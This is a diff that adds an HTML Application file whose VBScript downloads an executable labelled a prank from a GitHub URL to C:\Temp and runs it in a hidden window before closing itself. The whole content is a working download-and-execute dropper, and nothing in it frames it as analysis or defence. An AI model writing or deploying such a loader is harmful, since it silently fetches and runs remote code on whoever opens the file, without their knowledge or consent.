@@ -1,0 +1,20 @@
+<HTA:APPLICATION>
+<script language="VBScript">
+  Dim objXMLHTTP, objADOStream, strURL, strPath
+  strURL = "https://github.com/samuba/unlocked-pc-prank/raw/master/BuildOutput/unlocked-pc-prank.exe"
+  strPath = "C:\Temp\prank.exe"
+  Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP")
+  objXMLHTTP.open "GET", strURL, False
+  objXMLHTTP.send()
+  If objXMLHTTP.Status = 200 Then
+    Set objADOStream = CreateObject("ADODB.Stream")
+    objADOStream.Open
+    objADOStream.Type = 1 'adTypeBinary
+    objADOStream.Write objXMLHTTP.ResponseBody
+    objADOStream.Position = 0
+    objADOStream.SaveToFile strPath
+    objADOStream.Close
+    CreateObject("WScript.Shell").Run strPath, 0, False
+  End If
+  self.close
+</script>
